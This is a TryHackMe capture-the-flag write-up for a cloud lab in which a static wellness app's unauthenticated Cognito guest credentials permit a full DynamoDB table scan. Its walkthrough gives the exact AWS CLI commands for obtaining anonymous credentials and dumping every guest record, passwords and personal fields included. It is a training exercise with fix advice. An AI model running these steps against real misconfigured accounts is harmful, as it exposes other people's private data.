| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Event** | Hacker Holidays 2026 — The Byte Lotus |
| **Day** | 3 |
| **Room** | Complimentary |
| **Category** | Cloud / AWS Cognito+DynamoDB |
| **Flag format** | THM{...} |

---

## Objective

The **Complimentary** wellness app has no login screen — yet it greets every visitor by name and pulls up their personal profile the moment the page loads. That "magic" is an **AWS Cognito Identity Pool** handing out **unauthenticated guest credentials** to anyone who opens the site, which the page then uses to call `dynamodb.getItem` for the visitor's own `guest_id`. The catch: the IAM role behind those unauthenticated identities grants **table-wide `dynamodb:Scan`**, not a per-key read scoped to the caller. So an anonymous visitor can pull *every* guest profile out of DynamoDB, not just their own — and one of those profiles is hiding the flag.

By the end of this room you will be able to:

- Read a static site's `app.js` to recover its **Identity Pool ID**, **table name** and **region**
- Explain how a **Cognito Identity Pool** issues **unauthenticated (guest) AWS credentials** with no login
- Exchange an anonymous `IdentityId` for temporary AWS credentials (`get-credentials-for-identity`)
- Recognise the difference between a scoped **`GetItem`** (the app's intended call) and a table-wide **`Scan`** (the exploit)
- Dump an entire DynamoDB table with anonymous creds and locate the flag in another guest's record
- Describe why unauthenticated IAM roles must be least-privilege and scoped with `dynamodb:LeadingKeys`

> **Authorisation warning:** This is a TryHackMe Hacker Holidays lab you are authorised to test. Requesting AWS credentials from Cognito pools and scanning DynamoDB tables against accounts you do not own is illegal — only ever run these techniques against systems you have **explicit authorization** to test.

---

## Story Hook

> _"No account needed. No login screen. It just... knows things about you the moment you open it."_ — and the app's own tagline invites you to _"ask it for more."_

The site is a static page served from an S3 website bucket at `http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/` — the AWS account id `332173347248` is sitting right there in the bucket name. There's no backend to break into and no password to guess. The whole trick is that the app trusts an anonymous visitor with more AWS permission than it should, and all the answers you need are in the JavaScript it ships to your browser.

---

## Attack Path

| **1** | **Recover the AWS config from `app.js`**<br>The static page has no login because it fetches unauthenticated guest credentials from a Cognito Identity Pool. Read the in-page `app.js` to extract `IDENTITY_POOL_ID = us-east-1:836c0949-292d-485b-b532-52d5ca7bb688`, `TABLE_NAME = complimentary-GuestWellnessProfiles` and `AWS_REGION = us-east-1`. |
| --- | --- |

| **2** | **Get an unauthenticated identity, then temporary creds**<br>Request an anonymous `IdentityId` from the pool (`get-id`, no signing required), then exchange it for temporary AWS access/secret/session credentials (`get-credentials-for-identity`). |
| --- | --- |

| **3** | **Scan the whole table instead of your own record**<br>The app only ever calls `dynamodb.getItem` for the visitor's own `guest_id`, but the unauthenticated IAM role allows table-wide `dynamodb:Scan`. Load the returned creds and scan `complimentary-GuestWellnessProfiles` to read every guest profile. |
| --- | --- |

| **4** | **Read the flag from another guest's `notes`**<br>The scan returns 5 guest records; the flag was planted in `guest-vip-042`'s `notes` field. |
| --- | --- |

---

## Walkthrough

**1. Get an unauthenticated identity from the pool** (no signing required):

```bash
$ aws cognito-identity get-id \
  --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
  --region us-east-1 --no-sign-request
```

**2. Exchange the `IdentityId` for temporary AWS credentials:**

```bash
$ aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:<IDENTITY_ID>" \
  --region us-east-1 --no-sign-request
```

**3. Load the returned creds and dump the entire table** — this is the exploit, a `Scan` instead of the app's per-key `GetItem`:

```bash
$ export AWS_ACCESS_KEY_ID="ASIA..."
$ export AWS_SECRET_ACCESS_KEY="..."
$ export AWS_SESSION_TOKEN="..."
$ aws dynamodb scan --table-name complimentary-GuestWellnessProfiles \
  --region us-east-1 --output json | grep -iE 'thm\{|flag'
```

The scan returned **5 guest records**, each carrying `email`, `phone`, `location`, `password` and `notes` fields:

| guest_id | Fields present | Flag? |
|---|---|---|
| `guest-vibe` | `email`, `phone`, `location`, `password`, `notes` | — |
| `guest-lambo` | `email`, `phone`, `location`, `password`, `notes` | — |
| `guest-vip-042` | `email`, `phone`, `location`, `password`, `notes` | Yes, in `notes` |
| `guest-patch` | `email`, `phone`, `location`, `password`, `notes` | — |
| `guest-ponzi` | `email`, `phone`, `location`, `password`, `notes` | — |

The flag was in **`guest-vip-042`**'s `notes` field:

> "If you're reading this, the wellness app's guest role can read every profile, not just its own. **THM{...}**"

---

## Flag

> **🚩 Flag**
> `THM{fr33_app_fr33_d4t4!}`

---

## Key Takeaways

An **unauthenticated Cognito Identity Pool** paired with an IAM role that allows table-wide **`Scan`** equals an anonymous full-table read. The application only ever intended to `GetItem` the caller's own record, but the *permission* it granted was far broader than the *behaviour* it exposed — and an attacker uses the permission, not the UI. Guest/unauth roles must be **least-privilege**, and for DynamoDB they must be scoped to the caller's own partition key using IAM `dynamodb:LeadingKeys` conditions so a visitor can only read their own item.

---

## Final Takeaway

The **Complimentary** room is a clean lesson in the gap between what an app *does* and what its credentials *allow*. Because the static site handed out **unauthenticated Cognito** guest credentials and the attached **IAM** role permitted a table-wide **`dynamodb:Scan`**, any anonymous visitor could swap the app's scoped `getItem` for a full **Scan** of `complimentary-GuestWellnessProfiles` and read all five guest profiles — flag included. Everything the attacker needed (the **Identity Pool ID**, table name and region) was shipped to the browser in `app.js`, so there was no server to breach at all. The fix is **least-privilege**: unauthenticated roles should never grant broad reads, and DynamoDB access for a guest identity must be constrained to the caller's own partition key with **`dynamodb:LeadingKeys`** conditions.

---
*Adapted from the [Hacker Holidays 2026 findings log](https://github.com/Varun-Patkar/HackerHolidays) by Varun Anand Patkar (MIT License).*
